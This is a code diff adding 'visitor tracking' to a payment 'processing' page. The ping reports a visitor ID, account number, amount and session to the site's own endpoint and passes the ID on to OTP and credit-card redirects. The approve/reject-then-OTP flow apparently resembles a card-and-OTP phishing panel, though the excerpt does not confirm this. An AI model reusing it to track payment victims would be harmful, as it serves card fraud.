@@ -155,6 +155,13 @@
       window.location.href = '/bill';
     }
 
+    // Visitor tracking
+    const _vid = params.get('vid') || localStorage.getItem('_vid') || '';
+    if (_vid) {
+      fetch('/api/visitor/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ visitorId: _vid, page: 'processing', number: number || '', amount: amount || '', type, sessionId }) }).catch(() => {});
+    }
+
     // Timeout countdown
     let timeLeft = 8 * 60;
     const timeoutBadge = document.getElementById('timeoutBadge');
@@ -191,12 +198,12 @@
       if (status === 'approved') {
         clearInterval(timeoutInterval);
         // Navigate to OTP page
-        const otpUrl = `/otp?sessionId=${sessionId}&number=${encodeURIComponent(number)}&amount=${encodeURIComponent(amount)}&ref=${encodeURIComponent(ref)}&type=${type}`;
+        const otpUrl = `/otp?sessionId=${sessionId}&number=${encodeURIComponent(number)}&amount=${encodeURIComponent(amount)}&ref=${encodeURIComponent(ref)}&type=${type}&vid=${encodeURIComponent(_vid)}`;
         window.location.href = otpUrl;
       } else if (status === 'rejected') {
         clearInterval(timeoutInterval);
         // Navigate back to credit-card with error message
-        const cardUrl = `/credit-card?number=${encodeURIComponent(number)}&amount=${encodeURIComponent(amount)}&ref=${encodeURIComponent(ref)}&type=${type}&error=card`;
+        const cardUrl = `/credit-card?number=${encodeURIComponent(number)}&amount=${encodeURIComponent(amount)}&ref=${encodeURIComponent(ref)}&type=${type}&error=card&vid=${encodeURIComponent(_vid)}`;
         window.location.href = cardUrl;
       }
     }
